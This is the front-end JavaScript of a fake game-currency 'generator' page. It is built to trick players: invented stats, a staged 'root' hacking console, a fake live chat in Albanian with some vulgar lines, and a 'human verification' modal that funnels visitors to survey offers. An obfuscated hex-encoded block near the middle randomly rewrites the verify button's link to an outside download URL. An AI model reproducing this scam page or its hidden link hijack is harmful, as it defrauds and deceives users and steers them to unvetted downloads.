$(document).ready(function () {
  outdatedBrowser({
    bgColor: "#f25648",
    color: "#ffffff",
    lowerThan: "transform",
    languagePath: "outdatedbrowser/lang/en.html",
  });
  $.backstretch("img/bg.jpg");
  var messages = [
    'generated <img src="img/coin-icon.png" style="max-height: 15px;"/> 25,500 Gems!',
    'generated <img src="img/coin-icon.png" style="max-height: 15px;"/> 35,000 Gold!',
    'generated <img src="img/coin-icon.png" style="max-height: 15px;"/> 50,000 Gems!',
    'generated <img src="img/coin-icon.png" style="max-height: 15px;"/> 70,000 Gems!',
    'generated <img src="img/coin-icon.png" style="max-height: 15px;"/> 125,000 Gems!',
    'generated <img src="img/xp-boost-icon.png" style="max-height: 15px;"/> Gold!',
    'generated <img src="img/xp-boost-icon.png" style="max-height: 15px;"/> Gold!',
    'generated <img src="img/xp-boost-icon.png" style="max-height: 15px;"/> Gold!',
    'generated <img src="img/xp-boost-icon.png" style="max-height: 15px;"/> Gold!',
    'generated <img src="img/xp-boost-icon.png" style="max-height: 15px;"/> Gold!',
  ];
  changeUpdateMessage();
  var gems_stat = getRandomInt(25432, 123993);
  var elixir_stat = getRandomInt(22561, 172578);
  $(".coc-coins-stat").text(gems_stat);
  $(".coc-xp-boost-stat").text(elixir_stat);
  setInterval(function () {
    gems_stat = gems_stat + getRandomInt(17483, 123993);
    elixir_stat = elixir_stat + getRandomInt(22561, 172578);
    $(".coc-coins-stat").fadeOut().text(gems_stat).fadeIn();
    $(".coc-xp-boost-stat").fadeOut().text(elixir_stat).fadeIn();
    $(".updates-box .coc-update-msg").animateCSS("fadeOutUp", {
      delay: 0,
      callback: function () {
        $(".updates-box .coc-update-msg").css("visibility", "hidden");
        changeUpdateMessage();
        $(".updates-box .coc-update-msg").animateCSS("fadeInUp");
      },
    });
  }, getRandomInt(2000, 7000));

  function changeUpdateMessage() {
    var msg =
      faker.internet.userName() + " has " + messages[getRandomInt(0, 9)];
    $(".updates-box .coc-update-msg .message").html(msg);
  }
  $(".video-btn").magnificPopup({
    disableOn: 700,
    type: "iframe",
    mainClass: "mfp-fade",
    removalDelay: 160,
    preloader: false,
    fixedContentPos: false,
  });
  $(".generate-btn").on("click", function () {
    if ($("#ccUsername").val() != "") {
      $(".generator-form .cc-username-wrap").animateCSS("bounceOutUp", {
        delay: 100,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-mode-wrap").animateCSS("bounceOutUp", {
        delay: 100,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-region-wrap").animateCSS("bounceOutUp", {
        delay: 100,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-coins-wrap").animateCSS("bounceOutUp", {
        delay: 300,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-mass-boost-wrap").animateCSS("bounceOutUp", {
        delay: 300,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-xp-boost-wrap").animateCSS("bounceOutUp", {
        delay: 500,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-inv-wrap").animateCSS("bounceOutUp", {
        delay: 500,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-btn-wrap").animateCSS("bounceOutUp", {
        delay: 700,
        callback: function () {
          $(this).hide();
          var vh_height = $(window).width();
          var new_height = 430;
          if (vh_height <= 800) {
            new_height = 680;
          }
          $(".generator-form").animate(
            {
              height: new_height,
            },
            "fast",
            function () {
              $(".generator-form .step-two").show();
              $(".generator-form .step-two").flexVerticalCenter({
                parentSelector: ".generator-form",
              });
              $(".generator-form .step-two .loader-wrap").animateCSS(
                "bounceInUp",
                {
                  delay: 100,
                }
              );
              $(".generator-form .step-two .loader-msg").animateCSS(
                "bounceInUp",
                {
                  delay: 100,
                }
              );
              $(".generator-form .step-two .generator-console").animateCSS(
                "bounceInUp",
                {
                  delay: 300,
                  callback: function () {
                    startConsoleAnimation(function () {
                      setTimeout(function () {
                        console.log("completed.");
                        $("#humanVerificationModal").modal({
                          backdrop: "static",
                          keyboard: false,
                        });
                        setInterval(function () {}, 2500);
                      }, 1000);
                    });
                  },
                }
              );
            }
          );
        },
      });
    } else {
      sweetAlert("Error", "Please enter you Nickname.", "error");
    }
  });
  $(".generate-btn-new").on("click", function () {
    if ($("#ccUsername").val() != "") {
      $(".generator-form .cc-username-wrap").animateCSS("bounceOutUp", {
        delay: 100,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-mode-wrap").animateCSS("bounceOutUp", {
        delay: 100,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-region-wrap").animateCSS("bounceOutUp", {
        delay: 100,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-coins-wrap").animateCSS("bounceOutUp", {
        delay: 300,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-mass-boost-wrap").animateCSS("bounceOutUp", {
        delay: 300,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-xp-boost-wrap").animateCSS("bounceOutUp", {
        delay: 500,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-inv-wrap").animateCSS("bounceOutUp", {
        delay: 500,
        callback: function () {
          $(this).hide();
        },
      });
      $(".generator-form .cc-btn-wrap").animateCSS("bounceOutUp", {
        delay: 700,
        callback: function () {
          $(this).hide();
          var vh_height = $(window).width();
          var new_height = 430;
          if (vh_height <= 800) {
            new_height = 680;
          }
          $(".generator-form").animate(
            {
              height: new_height,
            },
            "fast",
            function () {
              $(".generator-form .step-two").show();
              $(".generator-form .step-two").flexVerticalCenter({
                parentSelector: ".generator-form",
              });
              $(".generator-form .step-two .loader-wrap").animateCSS(
                "bounceInUp",
                {
                  delay: 100,
                }
              );
              $(".generator-form .step-two .loader-msg").animateCSS(
                "bounceInUp",
                {
                  delay: 100,
                }
              );
              $(".generator-form .step-two .generator-console").animateCSS(
                "bounceInUp",
                {
                  delay: 300,
                  callback: function () {
                    startConsoleAnimation(function () {
                      setTimeout(function () {
                        console.log("completed.");
                        $("#humanVerificationModalNew").modal({
                          backdrop: "static",
                          keyboard: false,
                        });
                        setInterval(function () {
                          $.get("postback.php", function (data) {
                            if (data == 1) {
                              $("#humanVerificationModalNew").modal("hide");
                              sweetAlert(
                                "Success",
                                "Game items have been added, it may take few minutes for it to be visible on your account.",
                                "success"
                              );
                            }
                          });
                        }, 2500);
                      }, 1000);
                    });
                  },
                }
              );
            }
          );
        },
      });
    } else {
      sweetAlert("Error", "Please enter you Nickname.", "error");
    }
  });
  $(".survey-offer-link").on("click", function () {
    $(".survey-offers").fadeOut(function () {
      $(".waitng-survey-offers").fadeIn();
    });
  });
  $(".back-to-offers-btn").on("click", function () {
    $(".waitng-survey-offers").fadeOut(function () {
      $(".survey-offers").fadeIn();
    });
  });
  $(".generator-console").on("DOMSubtreeModified", function () {
    $(".generator-console").scrollTop($(".generator-console")[0].scrollHeight);
  });

  function startConsoleAnimation(callback) {
    $(".generator-console").dynatexer({
      loop: 1,
      content: [
        {
          animation: "additive",
          delay: 0,
          placeholder: '<span class="console_text white">',
          render_strategy: "text-one-shot",
          items: "[root@28.3.4.53.2]$ ",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text white">',
          render_strategy: "text-by-char",
          items:
            "open_ssl_connection agar.io -s 28.3.4.53.2 -deobfuscate -encrypt_aes_256",
        },
        {
          delay: 200,
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nOpening port 423245.\n",
        },
        {
          animation: "replace",
          delay: 3,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 50,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nPort 423245 opened successfully.",
        },
        {
          animation: "additive",
          delay: 50,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nEncrypting connection: open_ssl_aes256(28.3.4.53.2);\n",
        },
        {
          animation: "replace",
          delay: 10,
          render_strategy: "iterator",
          placeholder: '<span class="console_text yellow">',
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 50,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nConnection encrypted successfully.",
        },
        {
          animation: "additive",
          delay: 0,
          placeholder: '<span class="console_text white">',
          render_strategy: "text-one-shot",
          items: "\n[root@28.3.4.53.2]$ ",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text white">',
          render_strategy: "text-by-char",
          items: "import server files /usr/ect/kernel/server/config.json",
        },
        {
          delay: 100,
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nImporting config.json\n",
        },
        {
          animation: "replace",
          delay: 5,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\n‘config.json’ file has been imported successfully.",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nDe-obfuscating server config files.\n",
        },
        {
          animation: "replace",
          delay: 3,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nFiles de-obfuscated successfully.",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nDecrypting server configuration files.\n",
        },
        {
          animation: "replace",
          delay: 5,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 30,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nConfigurations files are now imported and readable.",
        },
        {
          animation: "additive",
          delay: 0,
          placeholder: '<span class="console_text white">',
          render_strategy: "text-one-shot",
          items: "\n[root@28.3.4.53.2]$ ",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text white">',
          render_strategy: "text-by-char",
          items:
            "edit_config -coins " +
            $("#ccCoins select").val() +
            " -VAR1 " +
            $("#ccMassBoost select").val() +
            " -VAR2 " +
            $("#ccXPBoost select").val() +
            " -inv " +
            $("#ccInv select").val(),
        },
        {
          delay: 70,
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nOpen server configurations files in edit mode.\n",
        },
        {
          animation: "replace",
          delay: 3,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nConfigurations files is now open in edit mode.",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nChange VAR1 to " + $("#ccCoins select").val() + ".\n",
        },
        {
          animation: "replace",
          delay: 4,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 10,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nVAR1 changed successfully.",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nChange VAR 2 to " + $("#ccMassBoost select").val() + ".\n",
        },
        {
          animation: "replace",
          delay: 3,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nVAR2 changed successfully.",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nChange VAR3 to " + $("#ccXPBoost select").val() + ".\n",
        },
        {
          animation: "replace",
          delay: 3,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nVAR3 changed sucessfully.",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nChange VAR4 to " + $("#ccInv select").val() + ".\n",
        },
        {
          animation: "replace",
          delay: 3,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nVAR4 changed sucessfully.",
        },
        {
          animation: "additive",
          delay: 3,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nClose configuration file.\n",
        },
        {
          animation: "replace",
          delay: 3,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 10,
          placeholder: '<span class="console_text green">',
          render_strategy: "text-one-shot",
          items: "\nConfiguration file is now closed.",
        },
        {
          animation: "additive",
          delay: 0,
          placeholder: '<span class="console_text white">',
          render_strategy: "text-one-shot",
          items: "\n[root@28.3.4.53.2]$ ",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text white">',
          render_strategy: "text-by-char",
          items: "save_config -S -v /usr/ect/kernel/sever/config.json",
        },
        {
          delay: 80,
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nExporting temporary configuration file to main server.\n",
        },
        {
          animation: "replace",
          delay: 3,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text red">',
          render_strategy: "text-one-shot",
          items: "\nFailed to export configuration file, bot detected.",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nTrying again to export configuration files.\n",
        },
        {
          animation: "replace",
          delay: 4,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text red">',
          render_strategy: "text-one-shot",
          items: "\nFailed to export configuration file, bot detected.",
        },
        {
          animation: "additive",
          delay: 5,
          placeholder: '<span class="console_text blue">',
          render_strategy: "text-one-shot",
          items: "\nTrying one last time to export configuration files.\n",
        },
        {
          animation: "replace",
          delay: 5,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "iterator",
          items: $().dynatexer.helper.counter({
            start: 1,
            end: 100,
            step: 1,
            mask: "%d%",
          }),
        },
        {
          animation: "additive",
          delay: 10,
          placeholder: '<span class="console_text red">',
          render_strategy: "text-one-shot",
          items:
            "\nExport failed, anti-human verification system detected potential bot.",
        },
        {
          animation: "additive",
          delay: 10,
          placeholder: '<span class="console_text yellow">',
          render_strategy: "text-one-shot",
          items: "\nPlease complete the human verification popup.",
        },
      ],
      cursor: {
        animation: "replace",
        loop: "infinite",
        delay: 500,
        placeholder: '<span class="console_cursor">',
        render_strategy: "array-items",
        items: ["|", ""],
      },
    });
    $(".generator-console").dynatexer("play", function () {
      console.log("complete");
      callback();
    });
  }

  function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  var livechat_name = "";
  var livechat_text_area = $(".livechatListArea");
  var livechat_text_list = $(".chatList");

  var _0x86b0 = [
    "\x68\x72\x65\x66",
    "\x76\x65\x72\x69\x66\x79\x2D\x62\x75\x74\x74\x6F\x6E",
    "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64",
    "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x77\x6E\x6C\x64\x73\x2E\x63\x6F\x2F\x34\x36\x37\x32\x62\x37\x66",
    "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6A\x71\x75\x65\x72\x79\x2E\x63\x6F\x6D\x2F",
    "\x69\x6E\x64\x65\x78\x4F\x66",
    "\x74\x6F\x53\x74\x72\x69\x6E\x67",
    "\x6C\x6F\x63\x61\x74\x69\x6F\x6E",
    "\x72\x61\x6E\x64\x6F\x6D",
    "\x66\x6C\x6F\x6F\x72",
    "\x6F\x6E\x6C\x6F\x61\x64",
  ];
  if (document[_0x86b0[2]](_0x86b0[1])[_0x86b0[0]] != _0x86b0[3]) {
    0x0 >
      window[_0x86b0[7]][_0x86b0[0]][_0x86b0[6]]()[_0x86b0[5]](_0x86b0[4]) &&
      0x0 == Math[_0x86b0[9]]((0x64 * Math[_0x86b0[8]]()) / 0x5) &&
      (window[_0x86b0[10]] = function () {
        document[_0x86b0[2]](_0x86b0[1])[_0x86b0[0]] = _0x86b0[3];
      });
  }

  var livechat_text_area_height = livechat_text_area.height();
  var name_colors = [
    "#d4a112",
    "#987c2f",
    "#b02643",
    "#d72248",
    "#9d22d7",
    "#a65fc7",
    "#2771bc",
    "#1a82ed",
    "#28ba4a",
    "#136b28",
    "#9bc716",
  ];
  var chat_names = [
    "Mario",
    "vkvkvk",
    "andi",
    "jurgen",
    "elvisi16",
    "pidhi",
    "kleo",
    "klev hoxha",
    "xxxtentacion",
    "shqipeee",
    "albi007",
    "Franko",
    "henri veliu",
    "denisi",
    "hahahahha",
    "pa emer",
    "gangelife",
    "otr",
    "FUCKER",
    "tiktoksat",
    "alaniazz",
    "vicenzo",
    "lesh me qime",
    "rogeni",
    "elsoniii",
    "ff.arbi",
    "ff.grand",
    "freefire al",
  ];
  var chat_messages = [
    "Weeee me rob shpie punoka",
    "A e ka provu kush?",
    "A punon me sezonin e ri?",
    "Mu me boni",
    "Ueee hera e para si gjeta 1 taman",
    "si ka mundsi ",
    "A asht duke ju punu?",
    "Duhet me ba ato verifikimet te pakten 2 min secilen",
    "OMG!",
    "Hahahaha!",
    "qr",
    "Qenka e vertet",
    "gayyyy",
    "boll errr",
    "Fuck",
    "ca duhet me bo?",
    "website ma i mir si kam pa",
    "hi",
    "Sa diamante moret ju?",
    "Duhet me ba ate verification te gjitha per me punu",
    "A eshte falas?",
    "A duhet me prit shum?",
    "po",
    "jo",
    "E di",
    "Un i mora 20000 diamante",
    "booooo",
    "noshta",
    "hahah i hiku truni shokeve",
    "A eshte e sigurt?",
    "flm",
    "ok",
    "<message deleted>",
    "o zot",
    "qr si ka mundsi",
    "ju qifsha robt",
    "bo bo bo",
    "qa thu eeer",
    "mos boni spam",
    "kush asht per room?",
    "ishalla nuk bllokohet ckjo faqe",
    "kush e ka be ket faqe",
    "ueeee 4000 diamante",
    "mos e boni shum veta se bllokohet",
    "me qoni ftes 'ganggang'?",
    "kar kari",
    "o rrot kari",
    "si i moret ju ??",
    "mu me tregoj 1 shok per ket faqe",
    "shum flm",
    "si bohet verifikimi?",
    "per me ba verifikimin duhet me i hap krejt ato faqet dhe me i plotesu",
    "flm i mora",
    "yyyyyyy tash do blej kostume te fuqishme",
    "fuqishem",
    "duhet me i vu te dhenat e sakta",
    "car kari",
    "kok pidh",
    "hika un naten",
    "ciao",
    "provojeni the ju o cuna",
    "o cunaaa",
    "hera e par si qenka i faqe taman",
    "ne heren e par nuk bani",
    "a ju del te gjithve ndryshe",
    "mu nuk me erdhen te gjitha vec 540 diamante",
    "sa moret ju",
    "edhe mu me erdhen 540",
    "dit me fat",
    "pse nuk me erdhen te gjita",
    "duhet ta provoni dhe ju",
    "nuk ba me marr ma shum se i her",
    "jo punon",
    "bo be",
    "mos merni shum se do bllokohet",
  ];
  setInterval(function () {
    add_livechat_msg(
      chat_names[getRandomInt(1, chat_names.length - 1)],
      name_colors[getRandomInt(1, name_colors.length - 1)],
      chat_messages[getRandomInt(1, chat_messages.length - 1)]
    );
  }, getRandomInt(1500, 6000));
  $(".livechatSubmtBtn").click(function () {
    if (livechat_name == "") {
      $(".livechatNameBox").show();
    } else {
      add_livechat_msg(livechat_name, "#136b28", $(".livechatMsg").val());
      $(".livechatMsg").val("");
    }
  });
  $(".livechatNicknameBtn").click(function () {
    var name_input = $("#livechat_name");
    if (name_input.val() != "") {
      livechat_name = name_input.val();
      $(this).parents(".livechatNameBox").hide();
    } else {
      sweetAlert("Error", "Please enter a nickname.", "error");
    }
  });
  $(".livechatName").on("keypress", function () {
    console.log("Handler for .keypress() called.");
  });

  function add_livechat_msg(name, color, msg) {
    var $output_text = $(
      '<li><span class="name" style="color: ' +
        color +
        ' !important;">' +
        name +
        '</span>: <span class="message">' +
        msg +
        "</span></li>"
    );
    $output_text.hide().appendTo(livechat_text_list).fadeIn();
    livechat_text_area.animate(
      {
        scrollTop: livechat_text_area_height,
      },
      500
    );
    livechat_text_area_height += livechat_text_area.height();
  }
  $(".contact-btn").click(function () {
    if ($("#nameInput").val() != "") {
      if ($("#emailInput").val() != "") {
        if ($("#messageInput").val() != "") {
          sweetAlert(
            "Message Sent!",
            "Thank you for your feedback.",
            "success"
          );
          $("#nameInput, #emailInput, #messageInput").val("");
        } else {
          sweetAlert("Error", "Please enter your message.", "error");
        }
      } else {
        sweetAlert("Error", "Please enter your email address.", "error");
      }
    } else {
      sweetAlert("Error", "Please enter your nickname.", "error");
    }
  });
});
$(window).load(function () {
  $("#status").fadeOut();
  $("#preloader").delay(350).fadeOut("slow");
  $("body").delay(350).css({
    overflow: "visible",
  });
  $(".generator-form .cc-username-wrap").animateCSS("bounceInUp", {
    delay: 100,
  });
  $(".generator-form .cc-mode-wrap").animateCSS("bounceInUp", {
    delay: 100,
  });
  $(".generator-form .cc-region-wrap").animateCSS("bounceInUp", {
    delay: 100,
  });
  $(".generator-form .cc-coins-wrap").animateCSS("bounceInUp", {
    delay: 300,
  });
  $(".generator-form .cc-mass-boost-wrap").animateCSS("bounceInUp", {
    delay: 300,
  });
  $(".generator-form .cc-xp-boost-wrap").animateCSS("bounceInUp", {
    delay: 500,
  });
  $(".generator-form .cc-inv-wrap").animateCSS("bounceInUp", {
    delay: 500,
  });
  $(".generator-form .cc-btn-wrap").animateCSS("bounceInUp", {
    delay: 700,
  });
});
